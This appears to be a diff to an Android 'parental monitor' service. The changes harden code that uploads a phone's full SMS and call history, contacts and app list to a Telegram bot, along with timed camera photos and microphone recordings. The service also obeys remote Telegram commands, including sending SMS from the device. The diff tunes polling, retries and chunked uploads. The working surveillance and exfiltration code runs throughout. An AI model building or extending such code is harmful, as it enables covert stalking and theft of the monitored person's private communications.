@@ -76,7 +76,7 @@ class MonitoringService : Service() {
 
     companion object {
         const val ACTION_START_MONITORING = "START_MONITORING"
-        private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
+        private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{3,15}$")
         const val ACTION_STOP_MONITORING = "STOP_MONITORING"
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
@@ -118,7 +118,7 @@ class MonitoringService : Service() {
             if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until" || key == "sync_interval") refreshLoopConfig()
             if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until") restartCameraLoop()
         }
-        try { preferencesManager.registerChangeListener(credsListener!!) } catch (_: Exception) { }
+        try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
         smsRepository = SmsRepository(this)
         callLogRepository = CallLogRepository(this)
         messageQueue = MessageQueue.getInstance(this)
@@ -284,8 +284,8 @@ class MonitoringService : Service() {
         if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
             preferencesManager.initialSyncStarted = true
             initialSyncRunning.set(true)
-        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
-            preferencesManager.initialSyncDone = true
+        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
+            initialSyncRunning.set(true)
         }
         startPeriodicLoops()
         initialSyncJob = serviceScope.launch {
@@ -308,7 +308,7 @@ class MonitoringService : Service() {
         }
         val stuckRing = preferencesManager.ringPrevVolume
         val ringSavedAt = preferencesManager.ringSavedAt
-        if (stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 3_600_000L) {
+        if (stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 12 * 60 * 60_000L) {
             try {
                 val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                 audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
@@ -333,9 +333,9 @@ class MonitoringService : Service() {
                     if (!cachedMonitoringPaused) {
                         checkAndSendNewData()
                         touchHeartbeat(this@MonitoringService)
-                        delay(syncIntervalMillis())
+                        chunkedDelay(syncIntervalMillis())
                     } else {
-                        delay(15 * 60_000L)
+                        chunkedDelay(15 * 60_000L)
                     }
                 } catch (e: kotlinx.coroutines.CancellationException) {
                     throw e
@@ -361,14 +361,14 @@ class MonitoringService : Service() {
                 try {
                     if (cachedCameraInterval < 0) refreshLoopConfig()
                     val minutes = cachedCameraInterval.coerceIn(0, 60)
-                    val paused = System.currentTimeMillis() < cachedPhotoPausedUntil
+                    val paused = android.os.SystemClock.elapsedRealtime() < cachedPhotoPausedUntil
                     if (!cachedMonitoringPaused && !paused && minutes > 0) {
                         captureAndSendPhoto()
                         chunkedDelay(minutes * 60_000L)
                     } else if (cachedMonitoringPaused) {
                         chunkedDelay(5 * 60_000L)
                     } else {
-                        val remaining = cachedPhotoPausedUntil - System.currentTimeMillis()
+                        val remaining = cachedPhotoPausedUntil - android.os.SystemClock.elapsedRealtime()
                         val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
                         chunkedDelay(idle)
                     }
@@ -383,8 +383,13 @@ class MonitoringService : Service() {
 
     private suspend fun chunkedDelay(totalMs: Long) {
         if (totalMs <= 0L) return
-        currentCoroutineContext().ensureActive()
-        delay(totalMs)
+        var remaining = totalMs
+        while (remaining > 0L) {
+            currentCoroutineContext().ensureActive()
+            val step = remaining.coerceAtMost(5_000L)
+            delay(step)
+            remaining -= step
+        }
     }
 
     private fun refreshCreds() {
@@ -399,7 +404,7 @@ class MonitoringService : Service() {
         try {
             cachedCameraInterval = preferencesManager.cameraInterval
             cachedMonitoringPaused = preferencesManager.monitoringPaused
-            cachedPhotoPausedUntil = preferencesManager.photoPausedUntil
+            cachedPhotoPausedUntil = photoPausedElapsed()
             cachedSyncInterval = preferencesManager.syncInterval
         } catch (_: Exception) {
         }
@@ -446,7 +451,7 @@ class MonitoringService : Service() {
                 }
                 try {
                     val active = pollTelegramCommands()
-                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(20)
+                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(4)
                     touchHeartbeat(this@MonitoringService)
                 } catch (e: kotlinx.coroutines.CancellationException) {
                     throw e
@@ -472,7 +477,7 @@ class MonitoringService : Service() {
                 } else if (authBlocked()) {
                     delay(300_000)
                 } else {
-                    delay((15_000L + idlePolls * 10_000L).coerceAtMost(300_000L))
+                    delay((15_000L + idlePolls * 10_000L).coerceAtMost(60_000L))
                 }
             }
         }
@@ -528,11 +533,14 @@ class MonitoringService : Service() {
         }
 
         val updates = response.body()?.result ?: return false
-        val batchMax = updates.maxOfOrNull { it.updateId } ?: return false
-        if (batchMax > preferencesManager.lastUpdateId) {
-            preferencesManager.lastUpdateId = batchMax
-        }
+        if (updates.isEmpty()) return false
         for (update in updates) {
+            try {
+                if (update.updateId > preferencesManager.lastUpdateId) {
+                    preferencesManager.lastUpdateId = update.updateId
+                }
+            } catch (_: Exception) {
+            }
             val callback = update.callbackQuery
             if (callback != null) {
                 handleCallbackQuery(callback)
@@ -541,7 +549,7 @@ class MonitoringService : Service() {
             val message = update.message ?: update.editedMessage ?: continue
             if (message.chat.id.toString() != chatId) continue
             val full = (message.text ?: message.caption)?.trim() ?: continue
-            val raw = full.substringBefore("@").lowercase()
+            val raw = full.substringBefore("@").lowercase(java.util.Locale.ROOT)
             if (!raw.startsWith("/")) continue
             val input = if (raw == "/sms" || raw.startsWith("/sms ")) {
                 val smsArg = full.substringAfter(" ", "").trim()
@@ -549,7 +557,7 @@ class MonitoringService : Service() {
             } else raw
             handleTelegramCommand(input, message.date)
         }
-        return updates.isNotEmpty()
+        return true
     }
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
@@ -705,7 +713,8 @@ class MonitoringService : Service() {
                 val lastSync = preferencesManager.lastSyncTime
                 val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                 val photoState = if (isPhotoPaused()) {
-                    "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
+                    val leftMin = ((photoPausedElapsed() - android.os.SystemClock.elapsedRealtime()) / 60_000L).coerceAtLeast(1L)
+                    "paused ($leftMin min left)"
                 } else if (preferencesManager.cameraInterval <= 0) {
                     "manual only (/photo)"
                 } else {
@@ -761,14 +770,15 @@ class MonitoringService : Service() {
                 if (minutes == null) {
                     sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                 } else {
-                    preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
+                    preferencesManager.photoPausedUntil = android.os.SystemClock.elapsedRealtime() + minutes * 60_000L
                     sendToTelegram("⏸️ Photos paused for $minutes min.")
                 }
             }
             "/battery" -> {
                 val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
                 val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-                sendToTelegram("🔋 <b>Battery</b>\nLevel: $level%")
+                val levelText = if (level in 0..100) "$level%" else "unknown"
+                sendToTelegram("🔋 <b>Battery</b>\nLevel: $levelText")
             }
             "/stop" -> {
                 preferencesManager.monitoringPaused = true
@@ -1168,7 +1178,26 @@ class MonitoringService : Service() {
     }
 
     private fun isPhotoPaused(): Boolean {
-        return System.currentTimeMillis() < preferencesManager.photoPausedUntil
+        return android.os.SystemClock.elapsedRealtime() < photoPausedElapsed()
+    }
+
+    private fun photoPausedElapsed(): Long {
+        val stored = try {
+            preferencesManager.photoPausedUntil
+        } catch (_: Exception) {
+            0L
+        }
+        if (stored <= 0L) return 0L
+        if (stored > 1_000_000_000_000L) {
+            val remaining = stored - System.currentTimeMillis()
+            val migrated = if (remaining > 0L) android.os.SystemClock.elapsedRealtime() + remaining else 0L
+            try {
+                preferencesManager.photoPausedUntil = migrated
+            } catch (_: Exception) {
+            }
+            return migrated
+        }
+        return stored
     }
 
     private fun hasBackgroundLocation(): Boolean {
@@ -1282,56 +1311,71 @@ class MonitoringService : Service() {
             sendToTelegram(startMessage)
             delay(500)
 
-            // Send all SMS history in chunks
             if (allSms.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allSms.size} SMS...")
-                val message = buildString {
-                    appendLine("💬 <b>SMS History (${allSms.size})</b>")
-                    appendLine()
-                    allSms.forEach { sms ->
-                        appendLine("📞 Number: ${Html.escape(sms.address)}")
-                        val body = Html.escape(sms.body.take(200)) // Limit SMS body to 200 chars
-                        appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
-                        appendLine("🔄 Type: ${sms.getTypeString()}")
-                        appendLine("⏰ Time: ${formatDate(sms.date)}")
-                        appendLine("━━━━━━━━━━━━━━━━")
+                val smsTotal = allSms.size
+                allSms.chunked(10).forEachIndexed { index, part ->
+                    val message = buildString {
+                        appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
+                        appendLine()
+                        part.forEach { sms ->
+                            appendLine("📞 Number: ${Html.escape(sms.address)}")
+                            val body = Html.escape(sms.body.take(200))
+                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
+                            appendLine("🔄 Type: ${sms.getTypeString()}")
+                            appendLine("⏰ Time: ${formatDate(sms.date)}")
+                            appendLine("━━━━━━━━━━━━━━━━")
+                        }
                     }
+                    sendFitted(message)
+                    delay(500)
                 }
-                preferencesManager.lastSmsId = allSms.maxOf { it.id }
-                sendFitted(message)
-                delay(500)
+                try {
+                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, allSms.maxOf { it.id })
+                } catch (_: Exception) {
+                }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
             }
 
-            // Send all call history in chunks
             if (allCalls.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${allCalls.size} calls...")
-                val message = buildString {
-                    appendLine("📞 <b>Call History (${allCalls.size})</b>")
-                    appendLine()
-                    allCalls.forEach { call ->
-                        appendLine("📱 Number: ${Html.escape(call.number)}")
-                        if (call.name != null) {
-                            appendLine("👤 Name: ${Html.escape(call.name)}")
+                val callTotal = allCalls.size
+                allCalls.chunked(10).forEachIndexed { index, part ->
+                    val message = buildString {
+                        appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
+                        appendLine()
+                        part.forEach { call ->
+                            appendLine("📱 Number: ${Html.escape(call.number)}")
+                            if (call.name != null) {
+                                appendLine("👤 Name: ${Html.escape(call.name)}")
+                            }
+                            appendLine("🔄 Type: ${call.getTypeString()}")
+                            appendLine("⏱️ Duration: ${call.getDurationString()}")
+                            appendLine("⏰ Time: ${formatDate(call.date)}")
+                            appendLine("━━━━━━━━━━━━━━━━")
                         }
-                        appendLine("🔄 Type: ${call.getTypeString()}")
-                        appendLine("⏱️ Duration: ${call.getDurationString()}")
-                        appendLine("⏰ Time: ${formatDate(call.date)}")
-                        appendLine("━━━━━━━━━━━━━━━━")
                     }
+                    sendFitted(message)
+                    delay(500)
                 }
-                val latest = allCalls.maxWith(compareBy({ it.date }, { it.id }))
-                preferencesManager.lastCallTimestamp = latest.date
-                preferencesManager.lastCallId = latest.id
-                sendFitted(message)
-                delay(500)
+                try {
+                    val latest = allCalls.maxWith(compareBy({ it.date }, { it.id }))
+                    if (latest.date > preferencesManager.lastCallTimestamp ||
+                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                    ) {
+                        preferencesManager.lastCallTimestamp = latest.date
+                        preferencesManager.lastCallId = latest.id
+                    }
+                } catch (_: Exception) {
+                }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All calls sent")
             }
 
             // Final message
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
             val photoState = if (isPhotoPaused()) {
-                "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
+                val leftMin = ((photoPausedElapsed() - android.os.SystemClock.elapsedRealtime()) / 60_000L).coerceAtLeast(1L)
+                "paused ($leftMin min left)"
             } else if (preferencesManager.cameraInterval <= 0) {
                 "manual only (/photo)"
             } else {
@@ -1405,9 +1449,6 @@ class MonitoringService : Service() {
     }
 
     private suspend fun sendSmsPending(number: String, smsText: String) {
-        preferencesManager.pendingSmsNumber = ""
-        preferencesManager.pendingSmsText = ""
-        preferencesManager.pendingSmsAt = 0L
         try {
             val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 getSystemService(android.telephony.SmsManager::class.java)
@@ -1419,6 +1460,9 @@ class MonitoringService : Service() {
             } else {
                 smsManager.sendTextMessage(number, null, smsText, null, null)
             }
+            preferencesManager.pendingSmsNumber = ""
+            preferencesManager.pendingSmsText = ""
+            preferencesManager.pendingSmsAt = 0L
             preferencesManager.lastSmsSendAt = System.currentTimeMillis()
             sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
         } catch (e: SecurityException) {
@@ -1565,7 +1609,7 @@ class MonitoringService : Service() {
                 val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                 android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                 messageQueue.addMessage(message)
-                MessageScheduler.scheduleMessageSend(this, retryAfter * 1000L)
+                MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
             } else if (response.code() == 401 || response.code() == 403) {
                 android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                 try {
@@ -1656,8 +1700,15 @@ class MonitoringService : Service() {
     // ═══════════════════════════════════════════════════════════
     
     private fun captureAndSendPhoto(reportResult: Boolean = false) {
+        if (authBlocked()) {
+            serviceScope.launch {
+                if (reportResult) {
+                    sendToTelegram("Auth ditolak, foto ditunda sampai token diperbaiki di Setup.")
+                }
+            }
+            return
+        }
         if (pendingPhotoCount() >= 10) {
-            prunePhotoCache()
             serviceScope.launch {
                 if (reportResult) {
                     sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
@@ -1860,6 +1911,9 @@ class MonitoringService : Service() {
             commandJob?.cancel()
         } catch (_: Exception) {
         }
+        idlePolls = 0
+        refreshCreds()
+        refreshLoopConfig()
         startPeriodicLoops()
         startCommandPolling()
     }
@@ -1940,6 +1994,7 @@ class MonitoringService : Service() {
     private suspend fun recordAndSendAudio(seconds: Int) {
         val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
+        var keepForRetry = false
         activeAudioFile = audioFile
         try {
             recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -1962,13 +2017,17 @@ class MonitoringService : Service() {
                 sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
                 flushPendingAudio()
             } else {
+                keepForRetry = true
                 sendToTelegram("\u26A0\uFE0F Audio recorded but send failed. File kept for automatic retry.")
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
+            try { deleteQuietly(audioFile) } catch (_: Exception) { }
             throw e
         } catch (e: SecurityException) {
+            try { deleteQuietly(audioFile) } catch (_: Exception) { }
             sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
         } catch (e: Exception) {
+            try { deleteQuietly(audioFile) } catch (_: Exception) { }
             sendToTelegram("\u26A0\uFE0F Record failed.")
         } finally {
             try {
@@ -1976,12 +2035,16 @@ class MonitoringService : Service() {
             } catch (_: Exception) {
             }
             activeAudioFile = null
+            if (!keepForRetry) {
+                try { if (audioFile.exists() && audioFile.length() == 0L) deleteQuietly(audioFile) } catch (_: Exception) { }
+            }
             pruneAudioCache(MAX_AUDIO_KEPT)
         }
     }
 
     private suspend fun sendAudioFile(audioFile: File): Boolean {
         try {
+            if (authBlocked()) return false
             if (!hasNetwork()) return false
             val (botToken, chatId) = sendCreds()
             if (botToken.isEmpty() || chatId.isEmpty()) return false
@@ -2067,8 +2130,13 @@ class MonitoringService : Service() {
             cursor?.use { c ->
                 val nameIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                 val numIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
-                while (c.moveToNext() && out.size < 10) {
-                    out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
+                if (nameIdx >= 0 && numIdx >= 0) {
+                    while (c.moveToNext() && out.size < 10) {
+                        try {
+                            out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
+                        } catch (_: Exception) {
+                        }
+                    }
                 }
             }
         } catch (_: Exception) {
@@ -2079,7 +2147,12 @@ class MonitoringService : Service() {
     private fun listLaunchableApps(limit: Int): List<String> {
         return try {
             val intent = android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_LAUNCHER)
-            packageManager.queryIntentActivities(intent, 0).mapNotNull { r ->
+            val infos = if (android.os.Build.VERSION.SDK_INT >= 33) {
+                packageManager.queryIntentActivities(intent, android.content.pm.PackageManager.ResolveInfoFlags.of(0))
+            } else {
+                packageManager.queryIntentActivities(intent, 0)
+            }
+            infos.mapNotNull { r ->
                 try {
                     r.loadLabel(packageManager)?.toString()
                 } catch (_: Exception) {
@@ -2120,6 +2193,7 @@ class MonitoringService : Service() {
 
     private suspend fun sendPhotoFile(photoFile: File): Boolean {
         try {
+            if (authBlocked()) return false
             if (!hasNetwork()) {
                 android.util.Log.w("MonitoringService", "No network - photo saved for later")
                 return false
